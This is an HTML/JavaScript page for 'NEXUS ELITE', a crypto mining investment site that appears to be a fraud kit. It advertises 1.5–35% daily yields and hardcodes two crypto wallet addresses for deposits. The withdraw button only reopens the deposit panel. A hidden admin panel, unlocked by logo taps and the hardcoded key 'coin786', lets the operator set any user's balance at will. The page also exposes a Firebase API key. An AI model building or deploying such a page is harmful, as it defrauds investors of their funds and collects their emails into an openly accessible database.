<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS ELITE | Global Mining Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #f3ba2f; --bg-dark: #010204; --bg-light: #f8fafc; }
        body.dark-mode { background-color: var(--bg-dark); color: #ffffff; }
        body.light-mode { background-color: var(--bg-light); color: #0f172a; }
        
        .glass { backdrop-filter: blur(20px); border: 1px solid rgba(128,128,128,0.1); }
        .dark-mode .glass { background: rgba(15, 18, 23, 0.8); }
        .light-mode .glass { background: rgba(255, 255, 255, 0.7); }

        .crypto-text { background: linear-gradient(90deg, #f3ba2f, #ffaa00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hidden-section { display: none; }
        
        /* Node Card Styling */
        .node-card { transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); border-radius: 40px; }
        .node-card:hover { transform: translateY(-10px) scale(1.02); box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        .vip-gold { border: 2px solid var(--gold) !important; box-shadow: 0 0 20px rgba(243, 186, 47, 0.2); }

        /* Theme Switcher */
        .theme-btn { width: 50px; height: 26px; border-radius: 50px; position: relative; cursor: pointer; transition: 0.3s; }
        .theme-ball { width: 20px; height: 20px; border-radius: 50%; position: absolute; top: 3px; transition: 0.3s; }
        .dark-mode .theme-btn { background: #334155; }
        .light-mode .theme-btn { background: #e2e8f0; }
        .dark-mode .theme-ball { left: 27px; background: var(--gold); }
        .light-mode .theme-ball { left: 3px; background: #64748b; }

        .ping { height: 8px; width: 8px; border-radius: 50%; background: #10b981; display: inline-block; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.3; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body class="dark-mode transition-colors duration-500">

    <nav class="glass sticky top-0 z-[100] px-8 py-5 flex items-center justify-between border-b border-white/5">
        <div class="flex items-center gap-4 cursor-pointer" id="master-logo">
            <div class="w-12 h-12 bg-[#f3ba2f] rounded-2xl flex items-center justify-center font-black text-black text-2xl shadow-xl">N</div>
            <div>
                <h1 class="text-xl font-black italic tracking-tighter uppercase leading-none">Nexus<span class="crypto-text">Elite</span></h1>
                <p class="text-[8px] font-bold tracking-[0.3em] text-gray-500 uppercase">Institutional v4.0</p>
            </div>
        </div>
        
        <div class="flex items-center gap-6">
            <div onclick="toggleTheme()" class="theme-btn">
                <div class="theme-ball"></div>
            </div>
            <button onclick="toggleSidebar()" class="text-2xl hover:text-[#f3ba2f] transition"><i class="fa-solid fa-bars-staggered"></i></button>
        </div>
    </nav>

    <div id="admin-panel" class="fixed inset-0 z-[500] bg-black hidden flex items-center justify-center p-6">
        <div class="glass w-full max-w-2xl rounded-[50px] p-10 max-h-[80vh] overflow-y-auto">
            <div class="flex justify-between items-center mb-10">
                <h2 class="text-3xl font-black text-red-500 uppercase italic">Admin Terminal</h2>
                <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
            </div>
            <div id="user-list" class="space-y-4"></div>
        </div>
    </div>

    <section id="dashboard-section" class="section py-10 px-6 container mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-16">
            <div class="lg:col-span-2 glass p-12 rounded-[60px] relative overflow-hidden">
                <div class="absolute top-0 right-0 p-10 opacity-10"><i class="fa-solid fa-microchip text-9xl"></i></div>
                <p class="text-xs font-black text-gray-500 uppercase tracking-[0.4em] mb-6">Total Node Equity</p>
                <h2 id="main-balance" class="text-7xl md:text-9xl font-black italic tracking-tighter mb-12">$0.00</h2>
                <div class="flex flex-wrap gap-4">
                    <button onclick="openAction('deposit')" class="px-10 py-5 bg-[#f3ba2f] text-black font-black rounded-3xl text-xs uppercase shadow-2xl hover:scale-105 transition">Initialize Deposit</button>
                    <button onclick="openAction('withdraw')" class="px-10 py-5 bg-white/5 border border-white/10 font-black rounded-3xl text-xs uppercase hover:bg-white/10 transition">Withdraw Assets</button>
                </div>
            </div>
            <div class="glass p-10 rounded-[60px] flex flex-col justify-center border-t-4 border-[#f3ba2f]">
                <h4 class="text-[10px] font-black uppercase tracking-widest mb-6 text-gray-400">Profit Estimator</h4>
                <input type="number" id="calc-input" placeholder="Enter Amount" oninput="calculateProfit(this.value)" class="w-full p-4 mb-6 text-center font-black text-2xl bg-black/20 border-none rounded-2xl">
                <div class="space-y-4">
                    <div class="flex justify-between text-xs font-bold"><span>Daily:</span><span class="text-green-500" id="calc-day">$0.00</span></div>
                    <div class="flex justify-between text-xs font-bold"><span>Weekly:</span><span class="text-green-500" id="calc-week">$0.00</span></div>
                    <div class="flex justify-between text-xs font-bold"><span>Monthly:</span><span class="text-[#f3ba2f]" id="calc-month">$0.00</span></div>
                </div>
            </div>
        </div>

        <div class="flex items-center justify-between mb-10">
            <h3 class="text-2xl font-black italic uppercase tracking-tighter">Mining Clusters <span class="text-xs text-green-500 ml-2 font-mono underline">Active_15</span></h3>
            <span class="ping"></span>
        </div>
        
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8" id="nodes-grid">
            </div>
    </section>

    <div id="action-modal" class="fixed inset-0 z-[400] bg-black/95 backdrop-blur-3xl hidden flex items-center justify-center p-6">
        <div class="glass w-full max-w-lg rounded-[50px] p-12 animate__animated animate__fadeInUp">
            <div id="deposit-ui">
                <h3 class="text-3xl font-black italic mb-8 uppercase">Gateways</h3>
                <div class="space-y-4 mb-8" id="gateway-list">
                    <div class="p-6 bg-white/5 rounded-3xl border border-white/5 hover:border-[#f3ba2f] cursor-pointer" onclick="copyAddr('TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ')">
                        <p class="text-[9px] font-black text-[#f3ba2f] mb-1">BINANCE (TRC20)</p>
                        <p class="text-xs font-mono break-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                    <div class="p-6 bg-white/5 rounded-3xl border border-white/5 hover:border-[#f3ba2f] cursor-pointer" onclick="copyAddr('0xD9359EADE5F5bACA51fb7da043767Bc0685bC355')">
                        <p class="text-[9px] font-black text-blue-400 mb-1">METAMASK (ERC20)</p>
                        <p class="text-xs font-mono break-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                </div>
                <input type="text" id="tx-hash" placeholder="Transaction Hash ID" class="w-full p-4 mb-4 text-xs font-mono uppercase bg-black/40 border border-white/10 rounded-xl">
                <button onclick="submitDep()" class="w-full bg-[#f3ba2f] text-black font-black py-5 rounded-2xl shadow-xl uppercase text-xs tracking-widest">Verify Transfer</button>
            </div>
            <button onclick="document.getElementById('action-modal').classList.add('hidden')" class="mt-8 text-gray-500 font-bold uppercase text-[10px] w-full text-center">Close Panel</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBEqvT7AYCTZg1Bb6zEDtJn71QrYopX73M",
            authDomain: "coin-07.firebaseapp.com",
            databaseURL: "https://coin-07-default-rtdb.firebaseio.com",
            projectId: "coin-07",
            storageBucket: "coin-07.firebasestorage.app",
            messagingSenderId: "341970060013",
            appId: "1:341970060013:web:67374c0fd262b63bd342e4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- THEME ENGINE ---
        window.toggleTheme = () => {
            const b = document.body;
            if(b.classList.contains('dark-mode')) {
                b.classList.replace('dark-mode', 'light-mode');
            } else {
                b.classList.replace('light-mode', 'dark-mode');
            }
        };

        // --- SECRET ADMIN LOGIN ---
        let taps = 0;
        document.getElementById('master-logo').onclick = () => {
            taps++;
            if(taps === 4) {
                if(prompt("Security Key:") === "coin786") loadAdmin();
                taps = 0;
            }
            setTimeout(() => taps = 0, 3000);
        };

        // --- NODES DATA (15 NODES) ---
        const nodes = [
            {name: "Core-A", loc: "Dubai", min: 15, y: 1.5},
            {name: "Core-B", loc: "London", min: 50, y: 2.5},
            {name: "Core-C", loc: "Zurich", min: 100, y: 3.5},
            {name: "Core-D", loc: "Tokyo", min: 300, y: 4.8},
            {name: "Core-E", loc: "Singapore", min: 500, y: 5.5},
            {name: "Core-F", loc: "New York", min: 1000, y: 6.8},
            {name: "Core-G", loc: "Frankfurt", min: 1500, y: 8.0},
            {name: "Core-H", loc: "Reykjavik", min: 2500, y: 9.5},
            {name: "Core-I", loc: "Toronto", min: 4000, y: 11.0},
            {name: "Core-J", loc: "Hong Kong", min: 6000, y: 13.0},
            {name: "Core-K", loc: "Sydney", min: 8500, y: 15.5},
            {name: "Core-L", loc: "Stockholm", min: 12000, y: 18.0},
            {name: "Core-M", loc: "Moscow", min: 15000, y: 21.0},
            {name: "Core-N", loc: "Seoul", min: 20000, y: 25.0},
            {name: "Core-O", loc: "Orbital-1", min: 50000, y: 35.0}
        ];

        const renderNodes = () => {
            const grid = document.getElementById('nodes-grid');
            grid.innerHTML = nodes.map(n => `
                <div class="node-card glass p-8 ${n.min >= 5000 ? 'vip-gold' : ''}">
                    <div class="flex justify-between items-start mb-6">
                        <p class="text-[9px] font-black text-[#f3ba2f] uppercase tracking-widest">${n.name}</p>
                        <i class="fa-solid fa-shield-halved text-gray-500"></i>
                    </div>
                    <h4 class="text-xl font-black italic uppercase mb-2">${n.loc}</h4>
                    <div class="space-y-3 mb-8">
                        <div class="flex justify-between text-[10px]"><span class="text-gray-500 font-bold">Min Entry</span><span class="font-black">$${n.min}</span></div>
                        <div class="flex justify-between text-[10px]"><span class="text-gray-500 font-bold">Yield</span><span class="text-green-500 font-black">${n.y}% / Day</span></div>
                    </div>
                    <button onclick="document.getElementById('action-modal').classList.remove('hidden')" class="w-full py-4 bg-white/5 rounded-2xl text-[9px] font-black uppercase tracking-widest hover:bg-[#f3ba2f] hover:text-black transition">Lock Assets</button>
                </div>
            `).join('');
        };

        window.calculateProfit = (val) => {
            const amt = parseFloat(val) || 0;
            const yieldRate = 0.05; // 5% average
            document.getElementById('calc-day').innerText = '$' + (amt * yieldRate).toFixed(2);
            document.getElementById('calc-week').innerText = '$' + (amt * yieldRate * 7).toFixed(2);
            document.getElementById('calc-month').innerText = '$' + (amt * yieldRate * 30).toFixed(2);
        };

        // --- AUTH & DATA ---
        let currentUserId = localStorage.getItem('nexus_uid') || null;
        if(!currentUserId) {
            const email = prompt("Welcome to Nexus. Enter your institutional email to initialize:");
            if(email) {
                currentUserId = email.replace(/[.#$[\]]/g, "_");
                localStorage.setItem('nexus_uid', currentUserId);
                set(ref(db, 'users/' + currentUserId), { email: email, balance: 0, history: [] });
            }
        }

        if(currentUserId) {
            onValue(ref(db, 'users/' + currentUserId), (snap) => {
                if(snap.exists()) {
                    document.getElementById('main-balance').innerText = '$' + snap.val().balance.toLocaleString(undefined, {minimumFractionDigits: 2});
                }
            });
        }

        window.loadAdmin = () => {
            const modal = document.getElementById('admin-panel');
            modal.classList.remove('hidden');
            onValue(ref(db, 'users'), (snap) => {
                const data = snap.val();
                let html = "";
                for(let id in data) {
                    html += `
                        <div class="glass p-5 rounded-3xl flex justify-between items-center border border-red-500/10">
                            <div><p class="text-[10px] font-black text-gray-500">${data[id].email}</p><p class="text-lg font-black italic">$${data[id].balance}</p></div>
                            <button onclick="editBal('${id}')" class="bg-red-500 text-white px-4 py-2 rounded-xl text-[10px] font-bold">Edit</button>
                        </div>
                    `;
                }
                document.getElementById('user-list').innerHTML = html;
            });
        };

        window.editBal = (id) => {
            const val = prompt("Set balance for " + id);
            if(val) update(ref(db, 'users/' + id), { balance: parseFloat(val) });
        };

        window.copyAddr = (addr) => {
            navigator.clipboard.writeText(addr);
            alert("Address Copied to Secure Clipboard!");
        };

        renderNodes();
    </script>
</body>
</html>
